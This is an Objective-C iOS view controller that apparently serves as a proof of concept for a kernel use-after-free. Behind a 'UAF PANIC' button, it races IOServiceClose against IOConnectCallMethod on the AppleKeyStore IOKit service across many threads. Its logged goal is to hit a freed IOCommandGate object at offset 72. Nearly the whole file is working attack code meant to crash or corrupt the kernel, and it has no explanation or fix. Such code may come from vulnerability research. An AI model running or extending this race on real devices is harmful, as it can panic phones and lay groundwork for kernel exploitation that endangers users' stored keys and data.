#import "ViewController.h"
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdatomic.h>
#import <sys/sysctl.h>

#define AKS_SERVICE_NAME "AppleKeyStore"
#define NUM_CALLERS 8
#define NUM_CLOSERS 4
#define NUM_ITERATIONS 100000

static mach_port_t g_master_port = MACH_PORT_NULL;
static _Atomic(io_connect_t) g_closerace_conn = IO_OBJECT_NULL;
static atomic_int g_closerace_done = 0;
static uint64_t g_race_pattern = 0xbbbbbbbbbbbbbbbbULL;

static atomic_int g_closerace_calls = 0;
static atomic_int g_closerace_errors = 0;
static atomic_int g_closerace_closes = 0;
static atomic_int g_closerace_mig_err = 0;
static atomic_int g_closerace_stale = 0;
static atomic_int g_closerace_not_ready = 0;
static atomic_int g_closerace_invalid = 0;
static atomic_int g_closerace_opens = 0;

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor blackColor];
    IOMainPort(MACH_PORT_NULL, &g_master_port);

    UIButton *uafBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    uafBtn.frame = CGRectMake(40, self.view.bounds.size.height/2 - 40, self.view.bounds.size.width - 80, 80);
    [uafBtn setTitle:@"UAF PANIC" forState:UIControlStateNormal];
    [uafBtn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    uafBtn.backgroundColor = [UIColor purpleColor];
    uafBtn.layer.cornerRadius = 10;
    uafBtn.titleLabel.font = [UIFont boldSystemFontOfSize:28];
    [uafBtn addTarget:self action:@selector(uafPanic) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:uafBtn];

    UILabel *uafLabel = [[UILabel alloc] initWithFrame:CGRectMake(40, self.view.bounds.size.height/2 + 45, self.view.bounds.size.width - 80, 40)];
    uafLabel.text = @"IOServiceClose vs IOConnectCallMethod race\nIOCommandGate offset 72 modification";
    uafLabel.textColor = [UIColor grayColor];
    uafLabel.font = [UIFont systemFontOfSize:12];
    uafLabel.textAlignment = NSTextAlignmentCenter;
    uafLabel.numberOfLines = 2;
    [self.view addSubview:uafLabel];
}

void* closerace_caller(void* arg) {
    (void)arg;

    // Set high priority
    struct sched_param param = { .sched_priority = 47 };
    pthread_setschedparam(pthread_self(), SCHED_RR, &param);

    uint64_t scalars[6] = {g_race_pattern, g_race_pattern, g_race_pattern,
                           g_race_pattern, g_race_pattern, g_race_pattern};

    while (!atomic_load(&g_closerace_done)) {
        io_connect_t conn = atomic_load(&g_closerace_conn);
        if (conn == IO_OBJECT_NULL) continue;

        // Tight loop - hammer all selectors
        for (uint32_t sel = 0; sel < 16; sel++) {
            kern_return_t kr = IOConnectCallMethod(conn, sel,
                scalars, 6, NULL, 0, NULL, NULL, NULL, NULL);
            atomic_fetch_add(&g_closerace_calls, 1);

            if (kr != KERN_SUCCESS) {
                atomic_fetch_add(&g_closerace_errors, 1);
                if (kr == 0x10000003) {
                    atomic_fetch_add(&g_closerace_mig_err, 1);
                } else if (kr == 0xe00002c2) {
                    atomic_fetch_add(&g_closerace_not_ready, 1);
                } else if (kr == 0xe00002bc) {
                    atomic_fetch_add(&g_closerace_stale, 1);
                } else if (kr == 0xe00002ed || kr == 0xe00002c7) {
                    atomic_fetch_add(&g_closerace_invalid, 1);
                }
            }
        }
    }
    return NULL;
}

void* closerace_closer(void* arg) {
    (void)arg;

    // Set high priority
    struct sched_param param = { .sched_priority = 47 };
    pthread_setschedparam(pthread_self(), SCHED_RR, &param);

    while (!atomic_load(&g_closerace_done)) {
        io_connect_t conn = atomic_load(&g_closerace_conn);
        if (conn == IO_OBJECT_NULL) continue;

        // Race the close
        IOServiceClose(conn);
        atomic_fetch_add(&g_closerace_closes, 1);
        atomic_store(&g_closerace_conn, IO_OBJECT_NULL);
    }
    return NULL;
}

- (void)uafPanic {
    NSLog(@"[CLOSERACE] AGGRESSIVE MODE - Racing IOServiceClose vs IOConnectCallMethod");
    NSLog(@"[CLOSERACE] %d callers, %d closers, %d iterations", NUM_CALLERS, NUM_CLOSERS, NUM_ITERATIONS);
    NSLog(@"[CLOSERACE] Pattern: 0x%llx", g_race_pattern);
    NSLog(@"[CLOSERACE] Goal: hit freed IOCommandGate (offset 72)");

    g_race_pattern = 0xbbbbbbbbbbbbbbbbULL;
    atomic_store(&g_closerace_conn, IO_OBJECT_NULL);
    atomic_store(&g_closerace_done, 0);
    atomic_store(&g_closerace_calls, 0);
    atomic_store(&g_closerace_errors, 0);
    atomic_store(&g_closerace_closes, 0);
    atomic_store(&g_closerace_stale, 0);
    atomic_store(&g_closerace_mig_err, 0);
    atomic_store(&g_closerace_not_ready, 0);
    atomic_store(&g_closerace_invalid, 0);
    atomic_store(&g_closerace_opens, 0);

    // Spawn caller threads
    pthread_t callers[NUM_CALLERS];
    for (int i = 0; i < NUM_CALLERS; i++) {
        pthread_create(&callers[i], NULL, closerace_caller, NULL);
    }

    // Spawn closer threads
    pthread_t closers[NUM_CLOSERS];
    for (int i = 0; i < NUM_CLOSERS; i++) {
        pthread_create(&closers[i], NULL, closerace_closer, NULL);
    }

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
        io_service_t svc = IOServiceGetMatchingService(
            g_master_port, IOServiceMatching(AKS_SERVICE_NAME));
        if (!svc) {
            NSLog(@"[CLOSERACE] Service not found!");
            atomic_store(&g_closerace_done, 1);
            return;
        }

        NSLog(@"[CLOSERACE] Running %d connection cycles (no delay)...", NUM_ITERATIONS);

        for (int iter = 0; iter < NUM_ITERATIONS; iter++) {
            io_connect_t conn = IO_OBJECT_NULL;

            // Alternate connection types for variety
            uint32_t type = (iter % 4 == 0) ? 0x2022 :
                           (iter % 4 == 1) ? 0xbeef :
                           (iter % 4 == 2) ? 0x1337 : 0x4141;

            if (IOServiceOpen(svc, mach_task_self(), type, &conn) != KERN_SUCCESS) {
                continue;
            }

            atomic_fetch_add(&g_closerace_opens, 1);
            atomic_store(&g_closerace_conn, conn);

            // NO DELAY - maximize race window hits

            io_connect_t old = atomic_exchange(&g_closerace_conn, IO_OBJECT_NULL);
            if (old != IO_OBJECT_NULL) {
                IOServiceClose(old);
            }

            if (iter % 10000 == 0) {
                NSLog(@"[CLOSERACE] iter=%d opens=%d calls=%d closes=%d", iter,
                       atomic_load(&g_closerace_opens),
                       atomic_load(&g_closerace_calls),
                       atomic_load(&g_closerace_closes));
                NSLog(@"           MIG_ERR=%d STALE=%d NOT_READY=%d INVALID=%d",
                       atomic_load(&g_closerace_mig_err),
                       atomic_load(&g_closerace_stale),
                       atomic_load(&g_closerace_not_ready),
                       atomic_load(&g_closerace_invalid));
            }
        }

        IOObjectRelease(svc);

        atomic_store(&g_closerace_done, 1);

        NSLog(@"[CLOSERACE] Done");
        NSLog(@"[CLOSERACE] Total opens: %d", atomic_load(&g_closerace_opens));
        NSLog(@"[CLOSERACE] Total calls: %d", atomic_load(&g_closerace_calls));
        NSLog(@"[CLOSERACE] Total closes: %d", atomic_load(&g_closerace_closes));
        NSLog(@"[CLOSERACE] MIG_ERR=%d STALE=%d NOT_READY=%d INVALID=%d",
               atomic_load(&g_closerace_mig_err),
               atomic_load(&g_closerace_stale),
               atomic_load(&g_closerace_not_ready),
               atomic_load(&g_closerace_invalid));
    });
}

@end
